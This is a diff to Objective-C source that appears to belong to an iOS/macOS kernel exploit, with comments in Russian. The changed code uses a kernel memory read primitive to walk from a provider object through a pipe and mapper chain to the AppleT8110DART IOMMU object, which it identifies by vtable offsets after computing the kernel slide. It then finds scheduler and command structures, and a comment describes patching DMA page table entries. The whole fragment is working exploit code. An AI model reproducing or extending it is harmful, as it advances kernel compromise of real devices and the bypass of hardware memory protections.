@@ -6602,13 +6602,34 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   (unsigned long long)wVA, (unsigned long long)ucVA, (unsigned long long)provVA]);
         uint64_t pipeVA = 0, mapVA = 0, dartVA = 0;
         if (kpLooksLikeKernelPointer(provVA)) {
-            for (uint32_t pi = 0; pi < 8 && !pipeVA; pi++) {
-                uint64_t cand = kp_untag_ptr(early_kread64(provVA + 0x140 + (uint64_t)pi * 8));
-                if (kpLooksLikeKernelPointer(cand)) pipeVA = cand;
-            }
+            // 1.9.166 (р.39): pipe по битмаске активных [provider+0x180] → первый
+            // set-бит → [provider+0x140+idx*8]; scheduler = [pipe+0xb8] (не provider!)
+            uint64_t mask = early_kread64(provVA + 0x180);
+            int pidx = -1;
+            for (int b = 0; b < 8; b++) if (mask & (1ULL << b)) { pidx = b; break; }
+            if (pidx >= 0) pipeVA = kp_untag_ptr(early_kread64(provVA + 0x140 + (uint64_t)pidx * 8));
+            kpNote(r, [NSString stringWithFormat:@"  [P2] pipeMask=%#llx → pipe[%d]=%#llx",
+                      (unsigned long long)mask, pidx, (unsigned long long)pipeVA]);
         }
         if (kpLooksLikeKernelPointer(pipeVA)) mapVA = kp_untag_ptr(early_kread64(pipeVA + 0x78));
-        if (kpLooksLikeKernelPointer(mapVA)) dartVA = kp_untag_ptr(early_kread64(mapVA + 0x30));
+        // [mapper+0x30] = IODARTMapperNub (proxy, таблиц не держит) — хопим по
+        // [+0x30] до терминального AppleT8110DART (vt file 0x7dafcb0), 1-4 хопа
+        uint64_t ks4 = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t hopObj = mapVA;
+        for (int h = 0; h < 4 && kpLooksLikeKernelPointer(hopObj); h++) {
+            uint64_t hvt = kp_untag_ptr(early_kread64(hopObj));
+            uint64_t hFile = hvt ? hvt - ks4 : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dart-hop%d: obj=%#llx vt(file)=%#llx%@", h,
+                      (unsigned long long)hopObj, (unsigned long long)hFile,
+                      hFile == 0x7dafcb0 ? @" = AppleT8110DART ✓" :
+                      hFile == 0x7e6ab28 ? @" = IODARTMapperNub" :
+                      hFile == 0x7e6b118 ? @" = IODARTMapper" : @""]);
+            if (hFile == 0x7dafcb0) { dartVA = hopObj; break; }
+            uint64_t nxt = kp_untag_ptr(early_kread64(hopObj + 0x30));
+            if (nxt == hopObj) break;
+            hopObj = nxt;
+        }
+        if (!dartVA) dartVA = kpLooksLikeKernelPointer(hopObj) ? hopObj : 0;
         kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx",
                   (unsigned long long)pipeVA, (unsigned long long)mapVA, (unsigned long long)dartVA]);
         // 1.9.165: vtables всех звеньев (file-оффсеты) — идентификация классов
@@ -6638,7 +6659,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
         if (kpLooksLikeKernelPointer(provVA)) {
-            uint64_t schVA = kp_untag_ptr(early_kread64(provVA + 0xb8));
+            uint64_t schVA = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0xb8)) : 0;   // 1.9.166 (р.39): scheduler = [pipe+0xb8]
             uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
             uint64_t ecnt = kpLooksLikeKernelPointer(schVA) ? early_kread64(schVA + 0xb8) : 0;
             kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: scheduler=%#llx arr=%#llx count=%llu",
